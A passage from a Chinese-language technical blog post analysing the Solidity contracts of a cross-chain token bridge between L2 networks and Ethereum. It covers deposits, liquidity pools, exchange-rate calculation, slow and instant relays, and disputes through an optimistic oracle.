messengerContract,</span><br><span class="line">    uint256 l1CallValue,</span><br><span class="line">    address target,</span><br><span class="line">    address user,</span><br><span class="line">    uint256 l2Gas,</span><br><span class="line">    uint256 l2GasPrice,</span><br><span class="line">    uint256 maxSubmissionCost,</span><br><span class="line">    bytes memory message</span><br><span class="line">) private &#123;</span><br><span class="line">    require(l1CallValue == msg.value, &quot;Wrong number of ETH sent&quot;);</span><br><span class="line">    MessengerInterface(messengerContract).relayMessage&#123; value: l1CallValue &#125;(</span><br><span class="line">        target,</span><br><span class="line">        user,</span><br><span class="line">        l1CallValue,</span><br><span class="line">        l2Gas,</span><br><span class="line">        l2GasPrice,</span><br><span class="line">        maxSubmissionCost,</span><br><span class="line">        message</span><br><span class="line">    );</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>不同L2的消息方法分别在对应链的 <code>CrossDomainEnabled.sol</code> 合约中，比如：</p><ul><li>Arbitrum: <code>contracts/insured-bridge/avm/Arbitrum_CrossDomainEnabled.sol</code>；</li><li>Optimism，Boba: <code>contracts/insured-bridge/ovm/OVM_CrossDomainEnabled.sol</code>；</li></ul><h2><span id="bridgedepositbox">BridgeDepositBox</span></h2><p>接下来我们看到 <code>BridgeDepositBox.sol</code>，抽象合约 <code>BridgeDepositBox</code> 合约中主要有两个功能。</p><h3><span id="bridgetokens"><code>bridgeTokens</code></span></h3><p>第一个是 <code>bridgeTokens</code> 方法，用于将 L2 层代币通过原生代币桥转移到 L1 上，这个方法需要在不同的 L2 层合约上实现，目前支持的 L2 层包括 Arbitrum，Optimism 和 Boba，分别对应的文件为：</p><ul><li>Arbitrum: <code>contracts/insured-bridge/avm/AVM_BridgeDepositBox.sol</code></li><li>Optimism: <code>contracts/insured-bridge/ovm/OVM_BridgeDepositBox.sol</code></li><li>Boba: <code>contracts/insured-bridge/ovm/OVM_OETH_BridgeDepositBox.sol</code></li></ul><p>以 Arbitrum 链上的 <code>bridgeToken</code> 为例：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">  // BridgeDepositBox.sol 文件中</span><br><span class="line">  function canBridge(address l2Token) public view returns (bool) &#123;</span><br><span class="line">      return isWhitelistToken(l2Token) &amp;&amp; _hasEnoughTimeElapsedToBridge(l2Token);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">// AVM_BridgeDepositBox.sol文件中</span><br><span class="line">  function bridgeTokens(address l2Token, uint32 l1Gas) public override nonReentrant() &#123;</span><br><span class="line">      uint256 bridgeDepositBoxBalance = TokenLike(l2Token).balanceOf(address(this));</span><br><span class="line">      require(bridgeDepositBoxBalance &gt; 0, &quot;can&#x27;t bridge zero tokens&quot;);</span><br><span class="line">      require(canBridge(l2Token), &quot;non-whitelisted token or last bridge too recent&quot;);</span><br><span class="line"></span><br><span class="line">      whitelistedTokens[l2Token].lastBridgeTime = uint64(getCurrentTime());</span><br><span class="line"></span><br><span class="line">      StandardBridgeLike(l2GatewayRouter).outboundTransfer(</span><br><span class="line">          whitelistedTokens[l2Token].l1Token, // _l1Token. Address of the L1 token to bridge over.</span><br><span class="line">          whitelistedTokens[l2Token].l1BridgePool, // _to. Withdraw, over the bridge, to the l1 withdraw contract.</span><br><span class="line">          bridgeDepositBoxBalance, // _amount. Send the full balance of the deposit box to bridge.</span><br><span class="line">          &quot;&quot; // _data. We don&#x27;t need to send any data for the bridging action.</span><br><span class="line">      );</span><br><span class="line"></span><br><span class="line">      emit TokensBridged(l2Token, bridgeDepositBoxBalance, l1Gas, msg.sender);</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><p><code>bridgeTokens</code> 上有一个装饰器 <code>canBridge</code> 包含两个判断， <code>isWhitelistToken</code> 用于判断对应 L2 层代币是否已经在 L1 层上添加了桥接池， <code>_hasEnoughTimeElapsedToBridge</code> 用来减少频繁跨连导致的费用消耗问题，因此设置了最小的跨链接时间。</p><p><code>bridgeTokens</code> 主要就是调用了 L2 层原生的跨链方法，比如 <code>outboundTransfer</code>。</p><h3><span id="deposit"><code>deposit</code></span></h3><p>第二个是 <code>deposit</code> 方法用于将 L2 层资产转移到以太坊 L1 层上，对应与前端页面 Deposit 操作。对应代码为：</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="keyword">function</span> bridgeTokens(address l2Token, uint32 l2Gas) public virtual;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> deposit(</span><br><span class="line">    address l1Recipient,</span><br><span class="line">    address l2Token,</span><br><span class="line">    uint256 amount,</span><br><span class="line">    uint64 slowRelayFeePct,</span><br><span class="line">    uint64 instantRelayFeePct,</span><br><span class="line">    uint64 quoteTimestamp</span><br><span class="line">) public payable onlyIfDepositsEnabled(l2Token) <span class="function"><span class="title">nonReentrant</span></span>() &#123;</span><br><span class="line">    require(isWhitelistToken(l2Token), <span class="string">&quot;deposit token not whitelisted&quot;</span>);</span><br><span class="line"></span><br><span class="line">    require(slowRelayFeePct &lt;= 0.25e18, <span class="string">&quot;slowRelayFeePct must be &lt;= 25%&quot;</span>);</span><br><span class="line">    require(instantRelayFeePct &lt;= 0.25e18, <span class="string">&quot;instantRelayFeePct must be &lt;= 25%&quot;</span>);</span><br><span class="line"></span><br><span class="line">    require(</span><br><span class="line">        getCurrentTime() &gt;= quoteTimestamp - 10 minutes &amp;&amp; getCurrentTime() &lt;= quoteTimestamp + 10 minutes,</span><br><span class="line">        <span class="string">&quot;deposit mined after deadline&quot;</span></span><br><span class="line">    );</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> (whitelistedTokens[l2Token].l1Token == l1Weth &amp;&amp; msg.value &gt; 0) &#123;</span><br><span class="line">        require(msg.value == amount, <span class="string">&quot;msg.value must match amount&quot;</span>);</span><br><span class="line">        WETH9Like(address(l2Token)).deposit&#123; value: msg.value &#125;();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> IERC20(l2Token).safeTransferFrom(msg.sender, address(this), amount);</span><br><span class="line"></span><br><span class="line">    emit FundsDeposited(</span><br><span class="line">        chainId,</span><br><span class="line">        numberOfDeposits, // depositId: the current number of deposits acts as a deposit ID (nonce).</span><br><span class="line">        l1Recipient,</span><br><span class="line">        msg.sender,</span><br><span class="line">        whitelistedTokens[l2Token].l1Token,</span><br><span class="line">        l2Token,</span><br><span class="line">        amount,</span><br><span class="line">        slowRelayFeePct,</span><br><span class="line">        instantRelayFeePct,</span><br><span class="line">        quoteTimestamp</span><br><span class="line">    );</span><br><span class="line"></span><br><span class="line">    numberOfDeposits += 1;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>其中，合约区分了 ETH 和 ERC20 代币的存入方式。</p><p>存入资产后，合约产生了一个事件 <code>FundsDeposited</code>，用于中继者程序捕获并进行资产跨链，事件信息包含合约部署的 L2 链ID，存款ID <code>numberOfDeposits</code>，L1层接收者，存款者，L1和L2层代币地址，数量和费率，以及时间戳。</p><h2><span id="bridgepool">BridgePool</span></h2><p><code>BridgePool</code> 合约部署在 Layer 1 上，提供了给中继者完成 Layer2 上存款订单的函数。主要包含以下功能：</p><ol><li>流动性提供者添加和删除流动性的方法 <code>addLiquidity</code>， <code>removeLiquidity</code>；</li><li>慢速中继： <code>relayDeposit</code></li><li>即时中继： <code>relayAndSpeedUp</code>， <code>speedUpRelay</code></li><li>争议： <code>disputeRelay</code></li><li>解决中继： <code>settleRelay</code></li></ol><h3><span id="gou-zao-qi">构造器</span></h3><p>在合约初始时，合约设置了对应的桥管理员地址，L1代币地址，每秒的 LP 费率，以及标识是否为 WETH 池。同时，通过 <code>syncUmaEcosystemParams</code> 和 <code>syncWithBridgeAdminParams</code> 两个方法同步了 Optimistic Oracle 地址信息，Store 的地址信息，以及对应的 <code>ProposerBondPct</code> ， <code>OptimisticOracleLiveness</code> 等参数。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">  function syncUmaEcosystemParams() public nonReentrant() &#123;</span><br><span class="line">      FinderInterface finder = FinderInterface(bridgeAdmin.finder());</span><br><span class="line">      optimisticOracle = SkinnyOptimisticOracleInterface(</span><br><span class="line">          finder.getImplementationAddress(OracleInterfaces.SkinnyOptimisticOracle)</span><br><span class="line">      );</span><br><span class="line"></span><br><span class="line">      store = StoreInterface(finder.getImplementationAddress(OracleInterfaces.Store));</span><br><span class="line">      l1TokenFinalFee = store.computeFinalFee(address(l1Token)).rawValue;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">function syncWithBridgeAdminParams() public nonReentrant() &#123;</span><br><span class="line">      proposerBondPct = bridgeAdmin.proposerBondPct();</span><br><span class="line">      optimisticOracleLiveness = bridgeAdmin.optimisticOracleLiveness();</span><br><span class="line">      identifier = bridgeAdmin.identifier();</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">constructor(</span><br><span class="line">      string memory _lpTokenName,</span><br><span class="line">      string memory _lpTokenSymbol,</span><br><span class="line">      address _bridgeAdmin,</span><br><span class="line">      address _l1Token,</span><br><span class="line">      uint64 _lpFeeRatePerSecond,</span><br><span class="line">      bool _isWethPool,</span><br><span class="line">      address _timer</span><br><span class="line">  ) Testable(_timer) ERC20(_lpTokenName, _lpTokenSymbol) &#123;</span><br><span class="line">      require(bytes(_lpTokenName).length != 0 &amp;&amp; bytes(_lpTokenSymbol).length != 0, &quot;Bad LP token name or symbol&quot;);</span><br><span class="line">      bridgeAdmin = BridgeAdminInterface(_bridgeAdmin);</span><br><span class="line">      l1Token = IERC20(_l1Token);</span><br><span class="line">      lastLpFeeUpdate = uint32(getCurrentTime());</span><br><span class="line">      lpFeeRatePerSecond = _lpFeeRatePerSecond;</span><br><span class="line">      isWethPool = _isWethPool;</span><br><span class="line"></span><br><span class="line">      syncUmaEcosystemParams(); // Fetch OptimisticOracle and Store addresses and L1Token finalFee.</span><br><span class="line">      syncWithBridgeAdminParams(); // Fetch ProposerBondPct OptimisticOracleLiveness, Identifier from the BridgeAdmin.</span><br><span class="line"></span><br><span class="line">      emit LpFeeRateSet(lpFeeRatePerSecond);</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><h3><span id="tian-jia-he-shan-chu-liu-dong-xing">添加和删除流动性</span></h3><p>我们首先看到添加和删除流动性，添加流动性即流动性提供者向连接池中提供 L1 代币，并获取相应数量的 LP 代币作为证明，LP 代币数量根据现行汇率计算。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">function addLiquidity(uint256 l1TokenAmount) public payable nonReentrant() &#123;</span><br><span class="line">// 如果是 weth 池，调用发送 msg.value，msg.value 与 l1TokenAmount 相同</span><br><span class="line">// 否则，msg.value 必需为 0</span><br><span class="line">    require((isWethPool &amp;&amp; msg.value == l1TokenAmount) || msg.value == 0, &quot;Bad add liquidity Eth value&quot;);</span><br><span class="line"></span><br><span class="line"> // 由于 `_exchangeRateCurrent()` 读取合约的余额并使用它更新合约状态，</span><br><span class="line">// 因此我们必需在转入任何代币之前调用</span><br><span class="line">    uint256 lpTokensToMint = (l1TokenAmount * 1e18) / _exchangeRateCurrent();</span><br><span class="line">    _mint(msg.sender, lpTokensToMint);</span><br><span class="line">    liquidReserves += l1TokenAmount;</span><br><span class="line"></span><br><span class="line">    if (msg.value &gt; 0 &amp;&amp; isWethPool) WETH9Like(address(l1Token)).deposit&#123; value: msg.value &#125;();</span><br><span class="line">    else l1Token.safeTransferFrom(msg.sender, address(this), l1TokenAmount);</span><br><span class="line"></span><br><span class="line">    emit LiquidityAdded(l1TokenAmount, lpTokensToMint, msg.sender);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>由于合约支持 WETH 作为流动性池，因此添加流动性区分了 WETH 和其他 ERC20 代币的添加方法。</p><p>此处的难点在于 LP 代币和 L1 代币之间的汇率换算 <code>_exchangeRateCurrent</code> 的实现，我们从合约中提取出了 <code>_exchangeRateCurrent</code> 所使用的函数，包括 <code>_updateAccumulatedLpFees</code> 和 <code>_sync</code> ：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">function _getAccumulatedFees() internal view returns (uint256) &#123;</span><br><span class="line">      uint256 possibleUnpaidFees =</span><br><span class="line">          (undistributedLpFees * lpFeeRatePerSecond * (getCurrentTime() - lastLpFeeUpdate)) / (1e18);</span><br><span class="line">      return possibleUnpaidFees &lt; undistributedLpFees ? possibleUnpaidFees : undistributedLpFees;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  function _updateAccumulatedLpFees() internal &#123;</span><br><span class="line">      uint256 unallocatedAccumulatedFees = _getAccumulatedFees();</span><br><span class="line"></span><br><span class="line">      undistributedLpFees = undistributedLpFees - unallocatedAccumulatedFees;</span><br><span class="line"></span><br><span class="line">      lastLpFeeUpdate = uint32(getCurrentTime());</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">function _sync() internal &#123;</span><br><span class="line">      uint256 l1TokenBalance = l1Token.balanceOf(address(this)) - bonds;</span><br><span class="line">      if (l1TokenBalance &gt; liquidReserves) &#123;</span><br><span class="line">          </span><br><span class="line">          utilizedReserves -= int256(l1TokenBalance - liquidReserves);</span><br><span class="line">          liquidReserves = l1TokenBalance;</span><br><span class="line">      &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">function _exchangeRateCurrent() internal returns (uint256) &#123;</span><br><span class="line">      if (totalSupply() == 0) return 1e18; // initial rate is 1 pre any mint action.</span><br><span class="line"></span><br><span class="line">      _updateAccumulatedLpFees();</span><br><span class="line">      _sync();</span><br><span class="line"></span><br><span class="line">      int256 numerator = int256(liquidReserves) + utilizedReserves - int256(undistributedLpFees);</span><br><span class="line">      return (uint256(numerator) * 1e18) / totalSupply();</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><p>换算汇率等于当前合约中代币的储备与总 LP 供应量的比值，计算步骤如下：</p><ol><li>更新自上次方法调用以来的累积LP费用 <code>_updateAccumulatedLpFees</code><ol><li>计算可能未付的费用 <code>possibleUnpaidFees</code> ，等于未分配的 Lp 费用 <code>undistributedLpFees</code> * 每秒 LP 费率 *（当前时间-上次更新时间），目前 WETH 桥接池中每秒LP费率为 0.0000015。</li><li>计算累积费用 <code>unallocatedAccumulatedFees</code> ，如果 <code>possibleUnpaidFees</code> 小于未分配的 Lp 费用，则所有未分配的 LP 费用都将用于累积费用；</li><li>当前未分配 LP 费用 = 原先未分配 LP 费用 - 累积费用；</li></ol></li><li>计算由于代币桥接产生的余额变化<ol><li>当前合约中的代币储备=当前合约中的代币数量 - 被绑定在中继过程中的代币数量；</li><li>如果当前合约中的代币储备大于流动储备 <code>liquidReserves</code>，则被使用的储备  <code>utilizedReserves</code> = 原先被使用的储备 -（当前合约中的代币储备 - 流动储备）；</li><li>当前流动性储备 = 当前合约中的代币储备；</li></ol></li><li>计算汇率：<ol><li>经过更新之后，汇率计算的分子：流动储备 + 被使用的储备 - 未被分配 LP 费用；</li><li>分子与LP 代币总供应量的比值即为换算汇率。</li></ol></li></ol><p>利用换算汇率，可以计算得到添加 <code>l1TokenAmount</code> 数量的代币时所能得到的 LP 代币的数量。</p><p>对于移除流动性，过程与添加流动性相反，这里不再赘述。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">function removeLiquidity(uint256 lpTokenAmount, bool sendEth) public nonReentrant() &#123;</span><br><span class="line">    // 如果是 WETH 池，则只能通过发送 ETH 来取出流动性</span><br><span class="line">    require(!sendEth || isWethPool, &quot;Cant send eth&quot;);</span><br><span class="line">    uint256 l1TokensToReturn = (lpTokenAmount * _exchangeRateCurrent()) / 1e18;</span><br><span class="line"></span><br><span class="line">    // 检查是否有足够的流储备来支持取款金额</span><br><span class="line">    require(liquidReserves &gt;= (pendingReserves + l1TokensToReturn), &quot;Utilization too high to remove&quot;);</span><br><span class="line"></span><br><span class="line">    _burn(msg.sender, lpTokenAmount);</span><br><span class="line">    liquidReserves -= l1TokensToReturn;</span><br><span class="line"></span><br><span class="line">    if (sendEth) _unwrapWETHTo(payable(msg.sender), l1TokensToReturn);</span><br><span class="line">    else l1Token.safeTransfer(msg.sender, l1TokensToReturn);</span><br><span class="line"></span><br><span class="line">    emit LiquidityRemoved(l1TokensToReturn, lpTokenAmount, msg.sender);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3><span id="man-su-zhong-ji">慢速中继</span></h3><p>慢速中继，以及之后要讨论的即时中继，都会用到 <code>DepositData</code> 和 <code>RelayData</code> 这两个数据，前者表示存框交易的数据，后者表示中继交易的信息。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// 来自 L2 存款交易的数据。</span><br><span class="line">  struct DepositData &#123;</span><br><span class="line">      uint256 chainId;</span><br><span class="line">      uint64 depositId;</span><br><span class="line">      address payable l1Recipient;</span><br><span class="line">      address l2Sender;</span><br><span class="line">      uint256 amount;</span><br><span class="line">      uint64 slowRelayFeePct;</span><br><span class="line">      uint64 instantRelayFeePct;</span><br><span class="line">      uint32 quoteTimestamp;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">// 每个 L2 存款在任何时候都可以进行一次中继尝试。 中继尝试的特征在于其 RelayData。</span><br><span class="line">  struct RelayData &#123;</span><br><span class="line">      RelayState relayState;</span><br><span class="line">      address slowRelayer;</span><br><span class="line">      uint32 relayId;</span><br><span class="line">      uint64 realizedLpFeePct;</span><br><span class="line">      uint32 priceRequestTime;</span><br><span class="line">      uint256 proposerBond;</span><br><span class="line">      uint256 finalFee;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><p>下面我们看到 <code>relayDeposit</code> 方法，这个方法由中继者调用，执行从 L2 到 L1 的慢速中继。对于每一个存款而言，只能有一个待处理的中继，这个待处理的中继不包括有争议的中继。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">function relayDeposit(DepositData memory depositData, uint64 realizedLpFeePct)</span><br><span class="line">    public</span><br><span class="line">    onlyIfRelaysEnabld()</span><br><span class="line">    nonReentrant()</span><br><span class="line">&#123;</span><br><span class="line">// realizedLPFeePct 不超过 50%，慢速和即时中继费用不超过25%，费用合计不超过100%</span><br><span class="line">    require(</span><br><span class="line">        depositData.slowRelayFeePct &lt;= 0.25e18 &amp;&amp;</span><br><span class="line">            depositData.instantRelayFeePct &lt;= 0.25e18 &amp;&amp;</span><br><span class="line">            realizedLpFeePct &lt;= 0.5e18,</span><br><span class="line">        &quot;Invalid fees&quot;</span><br><span class="line">    );</span><br><span class="line"></span><br><span class="line">    // 查看是否已经有待处理的中继</span><br><span class="line">    bytes32 depositHash = _getDepositHash(depositData);</span><br><span class="line"></span><br><span class="line">// 对于有争议的中继，relays 中对应的 hash 会被删除，这个条件可以通过</span><br><span class="line">    require(relays[depositHash] == bytes32(0), &quot;Pending relay exists&quot;);</span><br><span class="line"></span><br><span class="line">// 如果存款没有正在执行的中继，则关联调用者的中继尝试</span><br><span class="line">    uint32 priceRequestTime = uint32(getCurrentTime());</span><br><span class="line"></span><br><span class="line">    uint256 proposerBond = _getProposerBond(depositData.amount);</span><br><span class="line"></span><br><span class="line">    // 保存新中继尝试参数的哈希值。</span><br><span class="line">    // 注意：这个中继的活跃时间（liveness）可以在 BridgeAdmin 中更改，这意味着每个中继都有一个潜在的可变活跃时间。</span><br><span class="line">// 这不应该提供任何被利用机会，特别是因为 BridgeAdmin 状态（包括 liveness 值）被许可给跨域所有者。</span><br><span class="line">RelayData memory relayData =</span><br><span class="line">        RelayData(&#123;</span><br><span class="line">            relayState: RelayState.Pending,</span><br><span class="line">            slowRelayer: msg.sender,</span><br><span class="line">            relayId: numberOfRelays++, // 注意：在将 relayId 设置为其当前值的同时增加 numberOfRelays。</span><br><span class="line">            realizedLpFeePct: realizedLpFeePct,</span><br><span class="line">            priceRequestTime: priceRequestTime,</span><br><span class="line">            proposerBond: proposerBond,</span><br><span class="line">            finalFee: l1TokenFinalFee</span><br><span class="line">        &#125;);</span><br><span class="line">    relays[depositHash] = _getRelayDataHash(relayData);</span><br><span class="line"></span><br><span class="line">    bytes32 relayHash = _getRelayHash(depositData, relayData);</span><br><span class="line"></span><br><span class="line">// 健全性检查池是否有足够的余额来支付中继金额 + 提议者奖励。 OptimisticOracle 价格请求经过挑战期后，将在结算时支付奖励金额。</span><br><span class="line">    // 注意：liquidReserves 应该总是 &lt;= balance - bonds。</span><br><span class="line">    require(liquidReserves - pendingReserves &gt;= depositData.amount, &quot;Insufficient pool balance&quot;);</span><br><span class="line"></span><br><span class="line">// 计算总提议保证金并从调用者那里拉取，以便 OptimisticOracle 可以从这里拉取它。</span><br><span class="line">    uint256 totalBond = proposerBond + l1TokenFinalFee;</span><br><span class="line">    pendingReserves += depositData.amount; // 在正在处理的准备中预订此中继使用的最大流动性。</span><br><span class="line">    bonds += totalBond;</span><br><span class="line"></span><br><span class="line">    l1Token.safeTransferFrom(msg.sender, address(this), totalBond);</span><br><span class="line">    emit DepositRelayed(depositHash, depositData, relayData, relayHash);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看到，存款哈希与 <code>depositData</code> 有关，中继哈希与 <code>depositData</code> 和 <code>relayData</code> 都有关。最后我们可以看到， <code>relayDeposit</code> 还未实际付款给用户的 L1 地址，需要等待中继者处理，或者通过加速处理中继。</p><h3><span id="jia-su-zhong-ji">加速中继</span></h3><p><code>speedUpRelay</code> 方法立即将存款金额减去费用后转发给 <code>l1Recipient</code>，即时中继者在待处理的中继挑战期后获得奖励。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">  // 我们假设调用者已经执行了链外检查，以确保他们尝试中继的存款数据是有效的。</span><br><span class="line">// 如果存款数据无效，则即时中继者在无效存款数据发生争议后无权收回其资金。</span><br><span class="line">// 此外，没有人能够重新提交无效存款数据的中继，因为他们知道这将再次引起争议。</span><br><span class="line">// 另一方面，如果存款数据是有效的，那么即使它被错误地争议，即时中继者最终也会得到补偿，</span><br><span class="line">// 因为会激励其他人重新提交中继，以获得慢中继者的奖励。</span><br><span class="line">// 一旦有效中继最终确定，即时中继将得到补偿。因此，调用者在验证中继数据方面与争议者具有相同的责任。</span><br><span class="line">function speedUpRelay(DepositData memory depositData, RelayData memory relayData) public nonReentrant() &#123;</span><br><span class="line">      bytes32 depositHash = _getDepositHash(depositData);</span><br><span class="line">      _validateRelayDataHash(depositHash, relayData);</span><br><span class="line">      bytes32 instantRelayHash = _getInstantRelayHash(depositHash, relayData);</span><br><span class="line">      require(</span><br><span class="line">          // 只能在没有与之关联的现有即时中继的情况下加速待处理的中继。</span><br><span class="line">          getCurrentTime() &lt; relayData.priceRequestTime + optimisticOracleLiveness &amp;&amp;</span><br><span class="line">              relayData.relayState == RelayState.Pending &amp;&amp;</span><br><span class="line">              instantRelays[instantRelayHash] == address(0),</span><br><span class="line">          &quot;Relay cannot be sped up&quot;</span><br><span class="line">      );</span><br><span class="line">      instantRelays[instantRelayHash] = msg.sender;</span><br><span class="line"></span><br><span class="line">      // 从调用者那里提取中继金额减去费用并发送存款到 l1Recipient。</span><br><span class="line">// 支付的总费用是 LP 费用、中继费用和即时中继费用的总和。</span><br><span class="line">      uint256 feesTotal =</span><br><span class="line">          _getAmountFromPct(</span><br><span class="line">              relayData.realizedLpFeePct + depositData.slowRelayFeePct + depositData.instantRelayFeePct,</span><br><span class="line">              depositData.amount</span><br><span class="line">          );</span><br><span class="line">      // 如果 L1 代币是 WETH，那么：a) 从即时中继者提取 WETH b) 解包 WETH 为 ETH c) 将 ETH 发送给接收者。</span><br><span class="line">      uint256 recipientAmount = depositData.amount - feesTotal;</span><br><span class="line">      if (isWethPool) &#123;</span><br><span class="line">          l1Token.safeTransferFrom(msg.sender, address(this), recipientAmount);</span><br><span class="line">          _unwrapWETHTo(depositData.l1Recipient, recipientAmount);</span><br><span class="line">          // 否则，这是一个普通的 ERC20 代币。 发送给收件人。</span><br><span class="line">      &#125; else l1Token.safeTransferFrom(msg.sender, depositData.l1Recipient, recipientAmount);</span><br><span class="line"></span><br><span class="line">      emit RelaySpedUp(depositHash, msg.sender, relayData);</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><h3><span id="ji-shi-zhong-ji">即时中继</span></h3><p><code>relayAndSpeedUp</code> 执行即时中继。这个方法的函数内容与 <code>relayDeposit</code> 和 <code>speedUpRelay</code> 方法是一致的，这里就不具体注释了，可以参考前文中的注释。这个函数的代码几乎是直接将 <code>relayDeposit</code> 和 <code>speedUpRelay</code> 的代码进行了合并，代码冗余。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">  // 由 Relayer 调用以执行从 L2 到 L1 的慢 + 快中继，完成相应的存款订单。</span><br><span class="line">  // 存款只能有一个待处理的中继。此方法实际上是串联的 relayDeposit 和 speedUpRelay 方法。</span><br><span class="line">// 这可以重构为只调用每个方法，但是结合传输和哈希计算可以节省一些 gas。</span><br><span class="line">function relayAndSpeedUp(DepositData memory depositData, uint64 realizedLpFeePct)</span><br><span class="line">      public</span><br><span class="line">      onlyIfRelaysEnabld()</span><br><span class="line">      nonReentrant()</span><br><span class="line">  &#123;</span><br><span class="line">      uint32 priceRequestTime = uint32(getCurrentTime());</span><br><span class="line"></span><br><span class="line">      require(</span><br><span class="line">          depositData.slowRelayFeePct &lt;= 0.25e18 &amp;&amp;</span><br><span class="line">              depositData.instantRelayFeePct &lt;= 0.25e18 &amp;&amp;</span><br><span class="line">              realizedLpFeePct &lt;= 0.5e18,</span><br><span class="line">          &quot;Invalid fees&quot;</span><br><span class="line">      );</span><br><span class="line"></span><br><span class="line">      bytes32 depositHash = _getDepositHash(depositData);</span><br><span class="line"></span><br><span class="line">      require(relays[depositHash] == bytes32(0), &quot;Pending relay exists&quot;);</span><br><span class="line"></span><br><span class="line">      uint256 proposerBond = _getProposerBond(depositData.amount);</span><br><span class="line"></span><br><span class="line">      RelayData memory relayData =</span><br><span class="line">          RelayData(&#123;</span><br><span class="line">              relayState: RelayState.Pending,</span><br><span class="line">              slowRelayer: msg.sender,</span><br><span class="line">              relayId: numberOfRelays++, // Note: Increment numberOfRelays at the same time as setting relayId to its current value.</span><br><span class="line">              realizedLpFeePct: realizedLpFeePct,</span><br><span class="line">              priceRequestTime: priceRequestTime,</span><br><span class="line">              proposerBond: proposerBond,</span><br><span class="line">              finalFee: l1TokenFinalFee</span><br><span class="line">          &#125;);</span><br><span class="line">      bytes32 relayHash = _getRelayHash(depositData, relayData);</span><br><span class="line">      relays[depositHash] = _getRelayDataHash(relayData);</span><br><span class="line"></span><br><span class="line">      bytes32 instantRelayHash = _getInstantRelayHash(depositHash, relayData);</span><br><span class="line">      require(</span><br><span class="line">          instantRelays[instantRelayHash] == address(0),</span><br><span class="line">          &quot;Relay cannot be sped up&quot;</span><br><span class="line">      );</span><br><span class="line"></span><br><span class="line">      require(liquidReserves - pendingReserves &gt;= depositData.amount, &quot;Insufficient pool balance&quot;);</span><br><span class="line"></span><br><span class="line">      uint256 totalBond = proposerBond + l1TokenFinalFee;</span><br><span class="line"></span><br><span class="line">      uint256 feesTotal =</span><br><span class="line">          _getAmountFromPct(</span><br><span class="line">              relayData.realizedLpFeePct + depositData.slowRelayFeePct + depositData.instantRelayFeePct,</span><br><span class="line">              depositData.amount</span><br><span class="line">          );</span><br><span class="line">      uint256 recipientAmount = depositData.amount - feesTotal;</span><br><span class="line"></span><br><span class="line">      bonds += totalBond;</span><br><span class="line">      pendingReserves += depositData.amount;</span><br><span class="line"></span><br><span class="line">      instantRelays[instantRelayHash] = msg.sender;</span><br><span class="line"></span><br><span class="line">      l1Token.safeTransferFrom(msg.sender, address(this), recipientAmount + totalBond);</span><br><span class="line"></span><br><span class="line">      if (isWethPool) &#123;</span><br><span class="line">          _unwrapWETHTo(depositData.l1Recipient, recipientAmount);</span><br><span class="line">      &#125; else l1Token.safeTransfer(depositData.l1Recipient, recipientAmount);</span><br><span class="line"></span><br><span class="line">      emit DepositRelayed(depositHash, depositData, relayData, relayHash);</span><br><span class="line">      emit RelaySpedUp(depositHash, msg.sender, relayData);</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><h3><span id="zheng-yi">争议</span></h3><p>当对待处理的中继提出争议时，争议者需要想 Optimistic Oracle 提交提案，并等待争议解决。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">  // 由 Disputer 调用以对待处理的中继提出争议。</span><br><span class="line">// 这个方法的结果是总是抛出中继，为另一个中继者提供处理相同存款的机会。</span><br><span class="line">// 在争议者和提议者之间，谁不正确，谁就失去了他们的质押。谁是正确的，谁就拿回来并获得一笔钱。</span><br><span class="line">function disputeRelay(DepositData memory depositData, RelayData memory relayData) public nonReentrant() &#123;</span><br><span class="line">      require(relayData.priceRequestTime + optimisticOracleLiveness &gt; getCurrentTime(), &quot;Past liveness&quot;);</span><br><span class="line">      require(relayData.relayState == RelayState.Pending, &quot;Not disputable&quot;);</span><br><span class="line">      // 检验输入数据</span><br><span class="line">      bytes32 depositHash = _getDepositHash(depositData);</span><br><span class="line">      _validateRelayDataHash(depositHash, relayData);</span><br><span class="line"></span><br><span class="line">      // 将提案和争议提交给 Optimistic Oracle。</span><br><span class="line">      bytes32 relayHash = _getRelayHash(depositData, relayData);</span><br><span class="line"></span><br><span class="line">      // 注意：在某些情况下，这会由于 Optimistic Oracle 的变化而失败，并且该方法将退还中继者。</span><br><span class="line">      bool success =</span><br><span class="line">          _requestProposeDispute(</span><br><span class="line">              relayData.slowRelayer,</span><br><span class="line">              msg.sender,</span><br><span class="line">              relayData.proposerBond,</span><br><span class="line">              relayData.finalFee,</span><br><span class="line">              _getRelayAncillaryData(relayHash)</span><br><span class="line">          );</span><br><span class="line"></span><br><span class="line">// 放弃中继并从跟踪的保证金中移除中继的保证金。</span><br><span class="line">      bonds -= relayData.finalFee + 